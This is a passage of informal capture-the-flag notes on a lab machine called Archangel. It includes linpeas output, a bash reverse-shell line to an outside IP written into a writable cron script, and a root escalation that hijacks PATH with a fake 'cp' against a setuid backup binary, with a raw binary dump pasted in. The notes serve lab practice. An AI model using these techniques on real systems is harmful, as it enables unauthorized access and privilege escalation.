/var/log/dpkg.log:2020-11-16 15:51:34 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-11-16 15:51:35 status installed passwd:amd64 1:4.5-1ubuntu2
/var/log/installer/status: Argon2 is a password-hashing function that can be used to hash passwords
/var/log/installer/status:Description: Set up users and passwords

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars                                                                       
APACHE_LOCK_DIR=/var/lock/apache2                                                           
APACHE_LOG_DIR=/var/log/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
LANG=C
OLDPWD=/home/archangel
PWD=/
PWD=/tmp
PWD=/var/www/html/development_testing
SHLVL=1
SHLVL=2
SHLVL=3
_=./linpeas.sh
_=/bin/bash
_=/bin/dd
_=/bin/grep
_=/usr/bin/xxd


                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════          
                                ╚════════════════╝                                          
Regexes to search for API keys aren't activated, use param '-r' 

```
here we can find ![[Pasted image 20251022173643.png]]
cron task, lets check it
![[Pasted image 20251022173730.png]]
we can write in this file and its gives us a reverse shell from archangel
use this
```shell
echo '#!/bin/bash
bash -i >& /dev/tcp/10.11.147.65/9000 0>&1' > /opt/helloworld.sh
```
and wait a minute
![[Pasted image 20251022174724.png]]
user is our, next take user2 flag
![[Pasted image 20251022174838.png]]
next step its root,
i find a script backup with code:
```shell
@@@@�▒▒▒ppEE   ���-�=�=hp�-�=�=�888 XXXDDS�td888 P�td< < < DDQ�tdR�td�-�=�=XX/lib64/ld-linux-x86-64.so.2GNU�GNU�����0�W�ΐ ��m�7EGN�e�mM%i x "setuidsystem__cxa_finalizesetgid__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable7u▒i    A��@�?�?�?�?��?�?�?��H�H��/H��t��H���5�/��%�/��h���������h���������h�����������%�/D��H�=��/��H�=9/H�2/H9�tH��.H��t^H�����H�=L�vH�   /H�5/H)�H��H��?H��H�H��tH��.H����fD�����=�.u+UH�=�.H��t
           H�=�.������d�����.]������w�����UH��������������H�=\������]����AWL�=�+AVI��AUI��ATA��UH�-�+SL)�H�����H��t1��L��L��D��A��H��H9�u�H�[]A\A]A^A_�ff.������H�H��cp /home/user/archangel/myfiles/* /opt/backupfiles@����t$����4����d���\M�������������4zRx
                                                                     ���/D$4h���@F▒J
                                                                                    �?▒:*3$"f����tx���0�y���/E�C
D�����eF�I▒�E �E(�D0�H8�G@n8A0A(B B▒B������@7
8�▒����o���
�
 ▒�?H(� ������oH���o���o2���o�=0@@GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0▒8X|��2  H
h
 (
 `p�8 < � �=�=�=▒�?@▒@�D| N��Y�[n@�▒@��=����=���N����!����=
�=�=&< 9▒�?�
            O0_ � @{@Y8���@� @� ��e▒▒@��/�▒@    �/"@. H\"/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrybackup.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment▒▒#886XX$I|| W���o��a
�  �< < D�� ������=�-��?�@0oHH�hh▒�B((H▒�  @�``�pp0�����88
                         @00&80x▒       �6x(9▒
```
but its see how trash but we can exexute this file and i want to know more use `string` 
```shell
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

```
and here we find:
![[Pasted image 20251022175542.png]]
`cp /home/user/archangel/myfiles/* /opt/backupfiles
but this way is not coorect and we cant to create link from `ln`, after i think a lot time, ask GPT and friend and find ineresting way to explotation this, firstly we need to use our cp how command what we write, just use PATH manipulation, first create cp how command and use S bits,payload in cp i tried two payloads and every is work 
```shell
python3 -c "import pty;pty.spawn('/bin/bash')" #or
bash -p
```
after use path magic
```shell
export PATH=/home/archangel/secret:$PATH
```
and use backup.sh
![[Pasted image 20251022181711.png]]
and last flag is
![[Pasted image 20251022181738.png]]
